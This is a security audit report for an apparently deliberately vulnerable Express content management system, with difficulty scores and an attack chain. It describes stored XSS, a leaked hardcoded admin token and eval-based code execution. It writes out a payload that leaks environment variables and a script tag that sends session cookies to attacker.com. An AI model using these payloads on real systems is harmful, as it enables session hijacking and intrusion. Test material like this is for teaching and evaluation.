# Audit Report: app-19 — Content Management System

**Language:** JavaScript (Express)  
**Business Domain:** Content Publishing  
**Date:** 2026-05-24

---

## Standalone Vulnerabilities

### VULN-01: A03 — Injection (Stored XSS)

**Severity:** High  
**Location:** `src/index.js:155-166` — `GET /api/posts/:id/comments`  
**Lines:**
```javascript
// VULNERABILITY A03: Stored XSS in comment retrieval
```

**Difficulty: EASY**

- Comments returned as raw JSON without HTML escaping
- Attacker can post a comment containing `<script>` payload
- Any reader viewing comments will execute the stored script

### VULN-02: A05 — Security Misconfiguration (Diagnostics Leak)

**Severity:** Medium  
**Location:** `src/index.js:258-275` — `GET /api/system/diagnostics`  
**Lines:**
```javascript
// VULNERABILITY A05: Security Misconfiguration - Diagnostics Endpoint
```

**Difficulty: EASY**

- Open diagnostics endpoint with `?debug=true` reveals config details
- Leaks hardcoded `editor_token: CMS-ADMIN-EDITOR-KEY-xyz9988`
- Token can be used as `x-editor-token` header to authenticate as admin

### VULN-03: A08 — Software and Data Integrity Failures (RCE via eval)

**Severity:** High  
**Location:** `src/index.js:188-215` — `POST /api/posts`  
**Lines:**
```javascript
// VULNERABILITY A08: Software and Data Integrity Failures - Insecure Deserialization
```

**Difficulty: MEDIUM**

- `layout_metadata` parsed via `eval()` — arbitrary code execution
- Requires authentication (AUTHOR role)
- Payload `{constructor.constructor('return process')().env}` leaks environment

---

## Chained Attack: chain-01

**Chain Name:** Diagnostics Token Leak → XSS Admin Session Hijack  
**Combined Impact:** Account Takeover  
**Overall Chain Difficulty: MEDIUM**

### Link 1: Diagnostics Endpoint Leaks Admin Token (A05 — Medium)

**Difficulty: EASY**

- `GET /api/system/diagnostics?debug=true` returns `editor_token: CMS-ADMIN-EDITOR-KEY-xyz9988`
- No authentication required
- Token can be used via `x-editor-token` header to impersonate admin

### Link 2: Stored XSS via Comments (A03 — Medium)

**Difficulty: EASY**

- Post a comment with `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
- When admin views the post, their session cookie is exfiltrated
- Attacker hijacks admin session for full account takeover

---

## Summary

App-19 is a JavaScript Express CMS with stored XSS in comments, a diagnostics endpoint leaking an admin editor token, and `eval()`-based RCE in post creation. Chain: Diagnostics token leak → stored XSS comment → admin session hijack.

**Overall Difficulty Score:** 2/5 (Easy)